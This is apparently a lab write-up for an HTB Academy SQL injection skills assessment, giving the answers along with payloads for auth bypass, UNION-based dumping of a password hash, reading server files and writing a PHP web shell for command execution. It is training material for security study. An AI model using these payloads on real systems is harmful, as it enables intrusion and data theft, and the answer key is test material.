# HTB Academy — CWES SQL Injection Fundamentals Skills Assessment

**Target:** `154.57.164.65:30631` (HTTPS)  
**App:** chattr GmbH — a chat web application

---

## Flags

- **Q1 (admin password hash):** `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`
- **Q2 (web root):** `/var/www/chattr-prod`
- **Q3 (RCE flag):** `061b1aeb94dec6bf5d9c27032b3c1d8d`

---

## Attack Chain

### 1. Recon — Map the App
```
/ → navbar with /login.php and /register.php
/login.php → form posts to /api/login.php
/register.php → form posts to /api/register.php (requires invitation code)
```

### 2. Test Login for SQLi
- Tried `admin'-- -`, `' OR '1'='1`, various auth bypass payloads → all returned "username or password is wrong"
- `' OR SLEEP(5)-- -` → 0.4s response → login uses parameterized queries, NOT injectable

### 3. Find Injection — Registration Invitation Code
- Single quote `'` in invitation code → `500 Internal Server Error` → injectable
- Wrong code (no injection) → `302 → /register.php?e=invalid+invitation+code`
- `OR 1=1-- -` → `500` — because invitations table is empty (OR on empty table = 0 rows still triggers PHP error on subsequent UPDATE query)

### 4. Bypass Invitation Code (Key Insight)
The `' OR '1'='1` pattern (no comment) works because the original query's closing quote closes the injected string:
```
SELECT * FROM invitations WHERE code='aaaa-bbbb-1111' or '1'='1'
```

**Payload in Burp Repeater:**
```
username=aaa&password=Test1234%21&repeatPassword=Test1234%21&invitationCode=aaaa-bbbb-1111' or '1'='1
```
Response: `302 → /login.php?s=account+created+successfully!`

**Critical lesson:** Valid-format prefix (`aaaa-bbbb-1111`) was required. Injecting without it gave 500 — the app validates the code format before SQL execution. Starting with a matching format pattern bypassed the validation.

### 5. Login and Find UNION Injection Point
Logged in as `aaa / Test1234!`. Inside the app, the **search field** in the chat is injectable.

Confirm 4 columns and find column 3 is displayed:
```
admin') union select 1,2,3,4-- -
```

### 6. Q1 — Enumerate and Dump Admin Hash
```sql
-- Current DB
admin') union select 1,2,database(),4-- -
-- → chattr

-- Tables in chattr
admin') union select 1,2,TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
-- → Users

-- Columns in Users
admin') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
-- → Username, Password

-- Dump admin hash
admin') union select 1,2,Password,4 from Users where Username="admin"-- -
```

### 7. Q2 — Find Web Root via LOAD_FILE
```sql
-- Read nginx config
admin') union select 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
-- → root /var/www/chattr-prod;
```

### 8. Q3 — Write Webshell and Get RCE
Confirmed FILE privilege and empty `secure_file_priv` (MariaDB default):
```sql
admin') union select 1,2,variable_value,4 from information_schema.global_variables where variable_name="secure_file_priv"-- -
-- → empty = can write anywhere
```

Write shell:
```sql
admin') union select "","<?php system($_REQUEST[0]); ?>","","" into outfile '/var/www/chattr-prod/shell.php'-- -
```

Find and read flag:
```
https://<TARGET>/shell.php?0=find / -name "flag_*" 2>/dev/null
→ /flag_876a4c.txt

https://<TARGET>/shell.php?0=cat /flag_876a4c.txt
→ 061b1aeb94dec6bf5d9c27032b3c1d8d
```

---

## Key Lessons

- **Test ALL fields, not just login** — the login was parameterized but the invitation code was injectable
- **OR on empty table = 0 rows** — `OR 1=1` on an empty table still returns nothing; use UNION instead
- **Valid-format prefix matters** — some fields validate format server-side before hitting SQL; prefix injection with a valid-looking value
- **`' OR '1'='1` without comment** — when the original query closes the string, no comment needed; cleaner and avoids comment-encoding issues
- **Multi-step forms re-use input** — if a form validates AND then updates (e.g. marks invitation code as used), injected input hits both queries; bypassing one may cause the other to 500
- **Burp Repeater > curl for manual injection** — direct body editing avoids URL-encoding mistakes
